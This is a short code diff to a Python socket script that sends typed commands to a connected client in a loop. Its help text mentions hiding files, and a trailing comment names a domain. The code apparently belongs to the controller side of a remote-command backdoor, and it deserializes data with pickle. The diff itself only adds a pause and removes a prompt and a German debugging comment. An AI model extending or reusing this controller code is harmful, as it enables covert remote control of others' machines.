@@ -1,6 +1,6 @@
 import socket
 from pickle import loads
-
+from time import sleep
 
 class Socket:
 
@@ -63,12 +63,11 @@ print("hide file -h")
 while True:
     if not connection.established:
         connection.listen_to_for_client()
-    print("\nEnter command:")
     user_input = input("> ")
     connection.send_command(user_input)
+    sleep(1)
 
 
 # uhblajkil.cf
-# Server empfängt "dir" nur beim nächsten Ausführen eines commands steckt im buffer oder so fest
 
 
